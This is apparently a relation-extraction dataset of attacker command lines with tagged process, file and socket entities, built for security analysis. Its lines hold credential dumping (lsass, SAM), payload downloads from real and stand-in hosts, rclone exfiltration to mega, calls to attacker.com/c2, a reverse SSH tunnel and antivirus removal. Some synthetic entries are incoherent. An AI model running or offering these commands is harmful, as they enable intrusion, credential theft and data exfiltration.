process-file-chmod(e1,e2)	rundll32.exe <e1>icacls</e1> <e2>/usr/local/bin/backdoor</e2> /grant Everyone:F
process-process-fork(e1,e2)	<e1>cmd.exe</e1> /C <e2>dir</e2> %HOMEDRIVE%%HOMEPATH%
process-file-read(e1,e2)	"<e1>powershell_11.exe</e1> -Command ""gc <e2>C:\ProgramData\conf_11.yaml""</e2>"
process-file-write(e1,e2)	<e1>net</e1> user <e2>DefaultAccount</e2> /active:yes;
process-process-fork(e1,e2)	<e1>powershell.exe</e1> <e2>rm</e2> /usr/local/bin/backdoor
process-process-fork(e1,e2)	"<e1>start</e1> <e2>wmic</e2> product where name=""McAfee DLP Endpoint"" call uninstall /nointeractive"
process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>7za.exe</e2> a -tzip -mx5 c:\programdata\lsass.dmp c:\programdata\lsass.zip
process-file-write(e1,e2)	<e1>cmd.exe</e1> /C copy 192145.dll <e2>\\<INTERNAL_IP>\ADMIN$</e2> /Y /Z
process-process-unlink(e1,e2)	<e1>python.exe</e1> kill $(Get-Process <e2>explorer.exe.Id)</e2>
process-file-read(e1,e2)	cmd.exe /c <e1>reg.exe</e1> save <e2>hklm\sam</e2> c:\users\REDACTED\appdata\local\temp\1\dznuxujzr
process-file-read(e1,e2)	"<e1>rundll32.exe</e1> ""C:\Users\REDACTED\AppData\Local\REDACTED\ikaqkk.dll"",update <e2>/i:""TimberMule\license.dat""</e2>"
process-process-unlink(e1,e2)	<e1>cmd.exe</e1> Stop-Process -Name <e2>taskmgr.exe</e2> -Force
process-process-unlink(e1,e2)	"C:\Windows\system32\cmd.exe /C cool.exe [DC IP ADDRESS] [DOMAIN NAME] Administrator -c <e1>""taskkill</e1> /f /im <e2>explorer.exe""</e2>"
process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>wmic</e2> /namespace:\\root\SecurityCenter2 PATH AntiVirusProduct GET /value
process-process-unlink(e1,e2)	<e1>cmd.exe</e1> kill $(Get-Process <e2>lsass.exe.Id)</e2>
process-process-unlink(e1,e2)	<e1>rundll32.exe</e1> kill $(Get-Process <e2>explorer.exe.Id)</e2>
process-process-fork(e1,e2)	"cmd.exe /C <e1>netsh</e1> advfirewall firewall add rule dir=in name =""WMI"" <e2>program=C:\Windows\system32\svchost.exe</e2> service=winmgmt action = allow protocol=TCP localport=any > C:\Windows\Temp\XsssmLZZ.tmp 2>&1"
process-socket-send(e1,e2)	<e1>rundll32.exe</e1> locker.dll,run /TARGET=\\HOST1.DOMAIN.NAME\C$ /TARGET=\\HOST2.DOMAIN.NAME\C$ <e2>/TARGET=\\HOST3.DOMAIN.NAME\C$</e2> /login=DOMAIN\Administrator /password=[REDACTED] /nolog /shareall
process-file-write(e1,e2)	<e1>notepad_65.exe</e1> <e2>C:\Users\test\notes_65.txt</e2>
process-file-write(e1,e2)	<e1>mshta_98.exe</e1> -write <e2>C:\Users\Public\hta_payload_98.hta</e2>
process-file-chmod(e1,e2)	C:\Windows\system32\cmd.exe /c <e1>attrib</e1> +S +H <e2>%appdata%\Microsoft\Network\python-3.10.4-embed-amd64.zip</e2>
process-file-write(e1,e2)	"PsExec.exe /accepteula -d \\REDACTED -u ""domain.local\Administrator"" -p ""REDACTED"" <e1>cmd</e1> /c COPY /Y ""\\REDACTED\share$\ds.exe"" <e2>%PUBLIC%\Music</e2>"
process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>nltest</e2> /dclist <domainname redacted>
process-process-fork(e1,e2)	"<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>adfind.exe</e2> -f ""objectcategory=computer"" > ad_computers.txt"
process-file-write(e1,e2)	"<e1>powershell_2.exe</e1> -Command ""Set-Content -Path <e2>C:\Windows\Temp\log_2.txt</e2> -Value 'infected'"""
process-process-fork(e1,e2)	<e1>wmic.exe</e1> <e2>chmod</e2> 777 C:\ProgramData\updater.exe
process-process-unlink(e1,e2)	powershell.exe <e1>taskkill</e1> /IM <e2>winlogon.exe</e2> /F
process-process-fork(e1,e2)	<e1>cmd.exe</e1> <e2>icacls</e2> /usr/local/bin/backdoor /grant Everyone:F
process-file-write(e1,e2)	"schtasks /create /RL HIGHEST /RU ""NT AUTHORITY\SYSTEM"" /sc minute /mo 30 /tn ""schdsWin"" /tr ""cmd.exe /C <e1>certutil.exe</e1> -urlcache -f http://192.169.6.122:6770/svchost.exe <e2>%systemdrive%\\Windows\\Temp\\svchost.exe</e2> & %systemdrive%\\Windows\\Temp\\svchost.exe"""
process-socket-receive(e1,e2)	wmic.exe <e1>python3</e1> -m <e2>http.server 8080</e2> --bind 192.168.1.100:8080
process-process-unlink(e1,e2)	python.exe <e1>taskkill</e1> /IM <e2>svchost.exe</e2> /F
process-socket-send(e1,e2)	"schtasks /create /RL HIGHEST /RU ""NT AUTHORITY\SYSTEM"" /sc minute /mo 30 /tn ""schdsWin"" /tr ""cmd.exe /C <e1>certutil.exe</e1> -urlcache -f <e2>http://192.169.6.122:6770/svchost.exe</e2> %systemdrive%\\Windows\\Temp\\svchost.exe & %systemdrive%\\Windows\\Temp\\svchost.exe"""
process-file-read(e1,e2)	C:\Windows\system32\cmd.exe /C <e1>wmic</e1> /namespace:\\root\SecurityCenter2 PATH <e2>FirewallProduct</e2> GET /value
process-process-fork(e1,e2)	<e1>powershell.exe</e1> <e2>icacls</e2> /usr/local/bin/backdoor /grant Everyone:F
process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C for /f %i in (C:\ProgramData\servers.txt) do ping -n 1 %i -v 4 | <e2>find</e2> /I TTL >> C:\ProgramData\servers_live.txt
process-process-fork(e1,e2)	"<e1>WMIC</e1> /node:""DC.example.domain"" process call create <e2>""rundll32</e2> C:\PerfLogs\arti64.dll, StartW"""
process-process-fork(e1,e2)	<e1>powershell.exe</e1> <e2>socat</e2> TCP4-LISTEN:8080,fork http://attacker.com/c2
process-file-write(e1,e2)	<e1>ntdsAudit.exe</e1> ntds.dit -s SYSTEM -p pwddump.txt -u <e2>users.csv</e2>
process-file-write(e1,e2)	"<e1>C:\Windows\system32\cmd.exe</e1> /C af.exe -f ""(objectcategory=organizationalUnit)"" > <e2>ad_ous.txt</e2>"
process-process-unlink(e1,e2)	wmic.exe <e1>taskkill</e1> /IM <e2>svchost.exe</e2> /F
process-process-unlink(e1,e2)	<e1>taskkill</e1> -f -im <e2>sqlbrowser.exe</e2>
process-file-write(e1,e2)	"<e1>cmd.exe</e1> /c ren ""%temp%\magni.waut.a"" <e2>""magni.w""</e2>"
process-file-exec(e1,e2)	"<e1>python.exe</e1> -Command ""Start-Process <e2>C:\Users\Public\runme.bat""</e2>"
process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>vssadmin</e2> create shadow
process-file-exec(e1,e2)	"cmd.exe /Q /c <e1>schtasks.exe</e1> /create /sc onlogon /tn ""Wow64 Subsystem"" /rl highest /tr <e2>""%%programdata%%\schcache\mswow86.exe""</e2>"
process-process-fork(e1,e2)	<e1>wmic.exe</e1> /c start <e2>cmd.exe</e2>
process-process-fork(e1,e2)	<e1>cmd.exe</e1> /Q /c <e2>expand</e2> cache.cab -F:* c:\programdata
process-file-write(e1,e2)	"<e1>python_44.exe</e1> -c <e2>""open('C:\\Users\\admin\\payload_44.exe',</e2> 'wb').write(b'\x90\x90\x90')"""
process-file-write(e1,e2)	cmd_10.exe /c <e1>echo</e1> malicious > <e2>C:\Temp\evil_10.bat</e2>
process-process-fork(e1,e2)	<e1>rundll32.exe</e1> <e2>Remove-Item</e2> C:\Users\Public\runme.bat -Force
process-file-read(e1,e2)	<e1>notepad_36.exe</e1> <e2>C:\Users\admin\notes_36.txt</e2>
process-file-write(e1,e2)	<e1>powershell</e1> invoke-webrequest -uri http://mrassociattes.com/images/62.gif -outfile <e2>c:\programdata\COIm.jpg</e2>
process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /c cd %appdata%\Microsoft\Network && <e2>powershell</e2> -Command start script.bat -Verb RunAs
process-file-read(e1,e2)	"<e1>""C:\Windows\system32\net.exe""</e1> group <e2>""domain admins""</e2> /domain"
process-file-write(e1,e2)	"<e1>powershell_66.exe</e1> <e2>""[IO.File]::WriteAllText('C:\Temp\backdoor_66.ps1',</e2> 'Invoke-Mimikatz')"""
process-file-write(e1,e2)	<e1>ftp_90.exe</e1> -s:script_90.txt <e2>C:\inetpub\wwwroot\ftp_90.log</e2>
process-socket-receive(e1,e2)	svchost.exe <e1>python3</e1> -m <e2>http.server 8080</e2> --bind https://evil.server/payload
process-file-write(e1,e2)	"<e1>net</e1> localgroup <e2>Administrators</e2> Support /add & net localgroup ""Remote Desktop Users"" Support /add"
process-file-write(e1,e2)	"<e1>find.exe</e1> -f ""(objectcategory=organizationalUnit)"" > <e2>ad_ous.txt</e2>"
process-file-exec(e1,e2)	<e1>C:\Windows\System32\rundll32.exe</e1> <e2>C:/Windows/Temp//rvhz1.dll</e2> DllRegisterServer
process-socket-send(e1,e2)	C:\Windows\system32\cmd.exe /C <e1>C:\Windows\Temp\adf\anchorAsjuster_x64.exe</e1> --source=anchorDNS_x64.exe --target=anchor_x64.exe <e2>--domain=xyskencevli.com,sluaknhbsoe.com</e2> --period=2 --lasthope=2 -guid
process-process-unlink(e1,e2)	<e1>C:\Windows\System32\taskkill.exe</e1> /IM <e2>veeam.backup.agent.configurationservice.exe</e2> /F
process-file-write(e1,e2)	<e1>certutil_29.exe</e1> -encode input_29.txt <e2>C:\temp\encoded_29.txt</e2>
process-socket-send(e1,e2)	<e1>powershell.exe</e1> Invoke-WebRequest -Uri <e2>https://evil.server/payload</e2> -Method POST
process-process-fork(e1,e2)	<e1>%WINDIR%\system32\cmd.exe</e1> /c <e2>net</e2> localgroup administrators sqlbackup /add
process-file-write(e1,e2)	<e1>reg</e1> add <e2>HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest</e2> /v UseLogonCredential /t REG\_DWORD /d 1 /f
Other	"<e1>C:\Windows\system32\cmd.exe</e1> /C cool.exe <e2>[DC IP ADDRESS]</e2> [DOMAIN NAME] Administrator -c ""taskkill /f /im explorer.exe"""
process-process-fork(e1,e2)	"VeeamHax.exe --verbose --target <backup server> --port 9401 --cmd ""c:\windows\notepad.exe"" --sql ""EXEC master..xp\_cmdshell <e1>'net</e1> localgroup administrators <e2>sqlbackup</e2> /add'"""
process-process-fork(e1,e2)	"<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>nltest</e2> /dclist:""DOMAINNAME"""
process-file-read(e1,e2)	<e1>reg_5.exe</e1> query <e2>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion</e2>
process-socket-send(e1,e2)	<e1>python.exe</e1> Invoke-WebRequest -Uri <e2>https://evil.server/payload</e2> -Method POST
process-file-read(e1,e2)	<e1>certutil_88.exe</e1> -encode <e2>input_88.txt</e2> C:\temp\encoded_88.txt
process-socket-receive(e1,e2)	<e1>certutil.exe</e1> -urlcache -split -f <e2>https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1</e2> powershellintelmodule.ps1
process-process-fork(e1,e2)	<e1>svchost.exe</e1> <e2>dllinjector.exe</e2> -p explorer.exe -d payload.dll
process-process-fork(e1,e2)	"<e1>VeeamHax.exe</e1> --verbose --target <backup server> --port 9401 --cmd <e2>""c:\windows\notepad.exe""</e2> --sql ""select @@version"""
process-process-fork(e1,e2)	<e1>powershell.exe</e1> <e2>chmod</e2> 777 /var/tmp/hide.so
Other	C:\Windows\system32\cmd.exe /C for /f %i in (C:\ProgramData\hosts.txt) do <e1>ping</e1> -n 1 %i -v 4 | find /I TTL >> <e2>C:\ProgramData\hosts_live.txt</e2>
process-file-read(e1,e2)	<e1>reg_12.exe</e1> query <e2>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion</e2>
process-process-fork(e1,e2)	<e1>rundll32.exe</e1> <e2>python3</e2> -m http.server 8080 --bind 10.10.10.10:4444
process-file-write(e1,e2)	<e1>powershell</e1> Expand-Archive python-3.10.4-embed-amd64.zip -DestinationPath <e2>%appdata%\Microsoft\Network</e2>
process-file-write(e1,e2)	"<e1>""C:\Program Files\7-Zip\7zG.exe""</e1> x -o <e2>""C:\Users\Public\netscan_portable""</e2> -spe -an -ai7zMap24244:76:7zEvent17814"
process-file-write(e1,e2)	"<e1>powershell</e1> Invoke-WebRequest ""http://temp.sh/VSlAV/http64.exe"" -OutFile <e2>C:\programdata\rr.exe</e2>"
process-process-fork(e1,e2)	<e1>powershell.exe</e1> <e2>icacls</e2> C:\Users\Public\runme.bat /grant Everyone:F
process-file-exec(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /c <e2>D:\max\eyewear.bat</e2>
process-file-write(e1,e2)	"<e1>powershell_16.exe</e1> -Command ""Set-Content -Path <e2>C:\Windows\Temp\log_16.txt</e2> -Value 'infected'"""
process-file-write(e1,e2)	<e1>mshta_79.exe</e1> -write <e2>C:\Users\Public\hta_payload_79.hta</e2>
process-socket-receive(e1,e2)	rundll32.exe <e1>python3</e1> -m http.server 8080 --bind <e2>192.168.1.100:8080</e2>
process-file-write(e1,e2)	<e1>mshta_54.exe</e1> -write <e2>C:\Users\Public\hta_payload_54.hta</e2>
process-socket-send(e1,e2)	<e1>C:\Windows\SysWOW64\explorer.exe</e1> <e2>\\IP_ADDRESS_2\C</e2>
process-process-fork(e1,e2)	<e1>adfind.exe</e1> -f objectcategory=computer > <e2>ad_computers.txt</e2>
process-file-read(e1,e2)	"<e1>python_54.exe</e1> -c <e2>""open('C:\\temp\\pw_54.txt').read()""</e2>"
process-file-read(e1,e2)	<e1>reg_32.exe</e1> query <e2>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion</e2>
process-file-write(e1,e2)	"cmd.exe /C <e1>reg</e1> <e2>add ""HKLM\software\microsoft\windows nt\currentversion\winlogon""</e2> /v UserInit /t reg_sz /d ""c:\windows\system32\userinit.exe,c:\users\[REDACTED]\appdata\local\notepad\UpdateEdge.bat"
process-file-write(e1,e2)	"<e1>C:\Windows\System32\cmd.exe</e1> /c echo curl https://moashraya[.]com/out/t.php --output ""%temp%\magni.waut.a"" --ssl no-revoke --insecure --location > <e2>%temp%\magni.w.bat</e2>"
process-file-unlink(e1,e2)	"start <e1>wmic</e1> product where <e2>name=""McAfee SiteAdvisor Enterprise""</e2> call uninstall /nointeractive"
process-process-fork(e1,e2)	<e1>svchost.exe</e1> <e2>del</e2> C:\Windows\Temp\evil.dll
process-process-inject(e1,e2)	rundll32.exe <e1>dllinjector.exe</e1> -p <e2>winlogon.exe</e2> -d payload.dll
process-socket-send(e1,e2)	rundll32.exe <e1>curl</e1> -X POST --data 'ping' <e2>10.10.10.10:4444</e2>
process-file-read(e1,e2)	<e1>7z_62.exe</e1> x <e2>C:\Users\Public\archive_62.7z</e2> -so > nul
process-file-read(e1,e2)	<e1>procdump64.exe</e1> -ma <e2>lsass.exe</e2> lsass.dmp
process-file-write(e1,e2)	C:\Windows\system32\cmd.exe /C <e1>7za.exe</e1> a -tzip -mx5 c:\programdata\lsass.dmp <e2>c:\programdata\lsass.zip</e2>
process-file-chmod(e1,e2)	python.exe <e1>attrib</e1> +s +h <e2>/tmp/malware.sh</e2>
process-socket-send(e1,e2)	"schtasks.exe /create /sc minute /mo 1 /tn ""SSH Key Exchange"" /rl highest /tr <e1>""C:\ProgramData\sshd\ssh.exe</e1> -i C:\ProgramData\sshd\config\keys\id_rsa -N -R <e2>369:127.0.0.1:2222</e2> root@185.206.146.129 -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=15"""
process-socket-receive(e1,e2)	powershell.exe <e1>socat</e1> TCP4-LISTEN:8080,fork <e2>192.168.1.100:8080</e2>
process-file-exec(e1,e2)	<e1>C:\Windows\system32\NOTEPAD.EXE</e1> <e2>C:\Users\USER\Desktop\New Text Document.txt</e2>
process-file-write(e1,e2)	<e1>net</e1> localgroup <e2>'Remote Desktop Users'</e2> /add DefaultAccount;
process-socket-send(e1,e2)	<e1>rclone.exe</e1> copy \\REDACTED\Shares <e2>mega:Shares</e2> -q --ignore-existing --auto-confirm --multi-thread-streams 4 --transfers 4
process-process-fork(e1,e2)	<e1>cmd.exe</e1> /C <e2>nltest</e2> /domain\_trusts&nltest /dclist:\&c:\windows\sysnative\nltest /domain\_trusts\&c:\windows\sysnative\nltest /dclist:
process-process-unlink(e1,e2)	python.exe <e1>taskkill</e1> /IM <e2>winlogon.exe</e2> /F
process-file-unlink(e1,e2)	"start <e1>wmic</e1> product where <e2>name=""Symantec Backup Exec Remote Agent for Windows""</e2> call uninstall /nointeractive"
process-process-fork(e1,e2)	"<e1>%WINDIR%\system32\cmd.exe</e1> /C <e2>.\rclone.exe</e2> copy ""E:\REDACTED\domain"" mega:REDACTED/domain -q --ignore-existing --REDACTED-confirm --multi-thread-streams 12 --transfers 12 --no-console"
Other	ping -n 1 <e1>hostname3</e1> >> <e2>C:\programdata\log.txt</e2>
process-process-fork(e1,e2)	<e1>cmd.exe</e1> /C <e2>ping</e2> -n 1 <redacted>
process-process-unlink(e1,e2)	<e1>taskkill</e1> /f /im <e2>QQPCMgr.exe</e2>
process-file-exec(e1,e2)	<e1>schtasks.exe</e1> /Create /F /XML <e2>C:\windows\temp\Wininet.xml</e2> /tn '\Microsoft\Windows\Maintenance\Wininet'
process-file-unlink(e1,e2)	"cmd.exe /c <e1>rmdir</e1> /S /Q <e2>""C:\Users\REDACTED\EmailStorage_REDACTED-REDACTED_REDACTED""</e2>"
Other	<e1>cmd.exe</e1> /q /c reg add hkey_local_machine\system\currentcontrolset\control\lsa /v disablerestrictedadmin /t reg_dword /d 0 1> <e2>\\127.0.0.1\admin\$\__<timestamp>\.<num></e2> 2>&1
process-file-exec(e1,e2)	"<e1>wmic.exe</e1> -Command ""Start-Process <e2>C:\Users\Public\runme.bat""</e2>"
process-process-fork(e1,e2)	<e1>svchost.exe</e1> <e2>nc</e2> -lvp 4444 -s 192.168.1.100:8080
process-file-exec(e1,e2)	"<e1>regsvr32</e1> /s /n /i\:Action <e2>""C:\Users\<user>\AppData\Roaming\Microsoft\20350.dll""</e2>"
process-process-fork(e1,e2)	"<e1>""C:\Windows\System32\schtasks.exe""</e1> /CREATE /SC ONCE /ST 17:21:58 /TN 9T6ukfi6 /TR <e2>""'C:\Users\pagefilerpqy.exe'""</e2> /f /RL HIGHEST"
process-process-fork(e1,e2)	<e1>cmd.exe</e1> /C <e2>net</e2> group /domain > C:\Windows\Temp\aWatKmSa.tmp 2>&1
process-file-write(e1,e2)	"<e1>powershell_21.exe</e1> <e2>""[IO.File]::WriteAllText('C:\Temp\backdoor_21.ps1',</e2> 'Invoke-Mimikatz')"""
process-file-read(e1,e2)	<e1>notepad_39.exe</e1> <e2>C:\Users\admin\notes_39.txt</e2>
process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /c cd %appdata%\Microsoft\Network && <e2>powershell</e2> Expand-Archive python-3.10.4-embed-amd64.zip -DestinationPath %appdata%\Microsoft\Network
process-socket-send(e1,e2)	"<e1>VeeamHax.exe</e1> --verbose --target <e2><backup server></e2> --port 9401 --cmd ""c:\windows\notepad.exe"" --sql ""EXEC master..xp\_cmdshell 'net user sqlbackup Password!1221! /add'"""
process-socket-receive(e1,e2)	python.exe <e1>socat</e1> <e2>TCP4-LISTEN:8080,fork</e2> https://evil.server/payload
process-process-fork(e1,e2)	<e1>rundll32.exe</e1> <e2>socat</e2> TCP4-LISTEN:8080,fork http://attacker.com/c2
process-socket-send(e1,e2)	<e1>ping</e1> -n 1 <e2>hostname2</e2> >> C:\programdata\log.txt
process-socket-send(e1,e2)	"svchost.exe <e1>powershell</e1> -c ""Invoke-RestMethod -Uri <e2>http://attacker.com/c2</e2> -Body 'cmd=whoami'"""
process-process-inject(e1,e2)	<e1>powershell.exe</e1> dllinjector.exe -p <e2>taskmgr.exe</e2> -d payload.dll
process-file-write(e1,e2)	"<e1>reg.exe</e1> add <e2>hkcu\software\classes\ms-settings\shell\open\command</e2> /v ""DelegateExecute"" /f"
process-process-fork(e1,e2)	"<e1>VeeamHax.exe</e1> --verbose --target <backup server> --port 9401 --cmd <e2>""c:\windows\notepad.exe""</e2> --sql ""RECONFIGURE"""
process-process-fork(e1,e2)	<e1>cmd.exe</e1> /C <e2>echo</e2> -------- >> C:\Users\<REDACTED>\AppData\Local\Temp\BD2C.bin1
process-file-read(e1,e2)	"""powershell.exe"" /c Remove-Item -Path C:\windows\temp\ssasl.pmd -Force -ErrorAction Ignore; rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id C:\windows\temp\ssasl.pmd full | out-host; <e1>Compress-Archive</e1> C:\windows\temp\ssasl.pmd <e2>C:\windows\temp\ssasl.zip</e2>"
process-process-fork(e1,e2)	<e1>wmic.exe</e1> <e2>dllinjector.exe</e2> -p svchost.exe -d payload.dll
process-file-write(e1,e2)	cmd.exe /C <e1>rundll32.exe</e1> C:\windows\System32\comsvcs.dll, MiniDump 968 <e2>C:\ProgramData\REDACTED\lsass.dmp</e2> full
process-file-exec(e1,e2)	"<e1>powershell.exe</e1> -Command ""Start-Process <e2>/var/tmp/hide.so""</e2>"
process-socket-send(e1,e2)	wmic.exe <e1>curl</e1> -X POST --data 'ping' <e2>http://attacker.com/c2</e2>
process-file-exec(e1,e2)	%windir%\system32\cmd.exe /c start <e1>rundll32.exe</e1> <e2>mkl2n.dll,kXlNkCKgFC</e2>
process-file-write(e1,e2)	C:\Windows\system32\cmd.exe /C for /f %i in (C:\ProgramData\hosts.txt) do ping -n 1 %i -v 4 | <e1>find</e1> /I TTL >> <e2>C:\ProgramData\hosts_live.txt</e2>
process-file-read(e1,e2)	<e1>reg_60.exe</e1> query <e2>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion</e2>
process-process-fork(e1,e2)	<e1>cmd_17.exe</e1> /c <e2>echo</e2> malicious > C:\Temp\evil_17.bat
process-socket-send(e1,e2)	cmd.exe /C <e1>ping</e1> <e2>WORKSTATION</e2>
process-file-read(e1,e2)	<e1>cmd.exe</e1> /q /c upload <e2>c:\users\<user>\documents\<doc></e2> /home/kali/desktop/<doc> 1> \\127.0.0.1\admin$\<num>.<num> 2>&1
process-process-fork(e1,e2)	<e1>python.exe</e1> <e2>curl</e2> -X POST --data 'ping' 10.10.10.10:4444
process-file-write(e1,e2)	<e1>adfind.exe</e1> -f objectcategory=computer -csv name operatingSystem > <e2>ad_computers_enum.txt</e2>
process-file-unlink(e1,e2)	"<e1>""powershell.exe""</e1> /c Remove-Item -Path <e2>C:\windows\temp\ssasl.pmd</e2> -Force -ErrorAction Ignore; rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id C:\windows\temp\ssasl.pmd full | out-host; Compress-Archive C:\windows\temp\ssasl.pmd C:\windows\temp\ssasl.zip"
process-file-exec(e1,e2)	<e1>cmd.exe</e1> -exec <e2>/usr/local/bin/backdoor</e2>
process-file-read(e1,e2)	"<e1>powershell_28.exe</e1> -Command ""gc <e2>C:\ProgramData\conf_28.yaml""</e2>"
process-file-read(e1,e2)	<e1>cmd_78.exe</e1> /c type <e2>C:\Windows\System32\drivers\etc\hosts</e2>
process-process-unlink(e1,e2)	<e1>net</e1> stop <e2>BackupExecJobEngine</e2> /y
process-process-fork(e1,e2)	<e1>cmd.exe</e1> /c <e2>reg.exe</e2> save hklm\system c:\users\REDACTED\appdata\local\temp\1\mkffdg
process-file-write(e1,e2)	"<e1>reg</e1> add <e2>""HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet""</e2> /v ""SpynetReporting"" /t REG\_DWORD /d ""0"" /f"
process-file-write(e1,e2)	"<e1>cmd</e1> /c COPY /Y ""\\REDACTED\share$\ds.exe"" <e2>%PUBLIC%\Music</e2>"
